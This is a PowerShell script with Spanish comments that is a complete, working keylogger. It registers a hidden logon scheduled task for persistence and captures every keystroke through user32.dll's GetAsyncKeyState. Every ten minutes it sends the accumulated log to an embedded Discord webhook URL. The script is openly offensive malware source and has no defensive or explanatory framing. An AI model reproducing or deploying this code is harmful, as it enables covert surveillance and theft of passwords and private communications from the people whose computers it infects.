# CONFIGURACIÓN INICIAL
$webhookUrl = "https://discord.com/api/webhooks/1403475722776871033/762S8PxXk-xvAR5_0v95C5Of-pfWYKpJnYO3i1e5w9CEFiz-HUQByB_8ycBZKs4DzaXt"
$logFile = "$env:APPDATA\SystemLogs\log.txt"
$lastSendFile = "$env:APPDATA\SystemLogs\lastsend.txt"
$taskName = "SystemLogger"

# CREAR CARPETA DE LOG SI NO EXISTE
$logDir = Split-Path $logFile -Parent
if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}

# REGISTRAR TAREA PROGRAMADA PARA PERSISTENCIA (USUARIO ACTUAL)
$task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $task) {
    $scriptPath = "$env:TEMP\logger.ps1"  # Usa la ruta conocida del script en TEMP
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME -Description "Ejecuta logger.ps1 al iniciar sesión del usuario actual" -Force
}

# FUNCIÓN PARA ENVIAR DATOS A DISCORD
function Send-ToDiscord {
    param ($content)
    try {
        $body = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
        return $true
    } catch {
        Add-Content -Path $logFile -Value "[$(Get-Date)] ERROR al enviar a Discord: $_"
        return $false
    }
}

# CARGAR DLL PARA CAPTURA DE TECLAS
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@

# INICIAR LOOP INFINITO
while ($true) {
    # CAPTURAR TECLAS
    for ($i = 1; $i -le 255; $i++) {
        $keyState = [Keyboard]::GetAsyncKeyState($i)
        if ($keyState -eq -32767) {
            $char = [char]$i
            if ([char]::IsControl($char)) { $char = "[CTRL+$i]" }
            $log = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $char"
            Add-Content -Path $logFile -Value $log
        }
    }

    # EXFILTRAR CADA 10 MINUTOS (ajustable a 120 más adelante)
    $now = Get-Date
    $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }

    if (($now - $lastSend).TotalMinutes -ge 10 -and (Test-Path $logFile)) {
        $data = Get-Content $logFile -Raw
        if ($data) {
            if (Send-ToDiscord -content $data) {
                Clear-Content -Path $logFile
                $now.ToString("o") | Out-File -FilePath $lastSendFile -Force
            }
        }
    }

    Start-Sleep -Milliseconds 200
}
